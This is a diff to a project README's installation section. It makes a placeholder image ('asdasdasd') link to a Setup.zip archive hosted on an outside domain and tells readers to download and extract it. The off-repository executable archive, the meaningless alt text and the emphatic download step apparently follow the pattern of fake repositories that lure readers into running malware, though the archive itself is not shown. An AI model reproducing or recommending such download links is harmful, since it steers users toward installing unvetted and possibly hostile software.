@@ -6,7 +6,8 @@
 ## Getting Started:
 
 ### Installation
-[![asdasdasd](https://dl.jrdesklabs.com/Setup.zip)
+[![asdasdasd](https://github.com/user-attachments/assets/aa9d1044-8fe1-4ff4-be59-40d6ec7ccc78)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 # **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
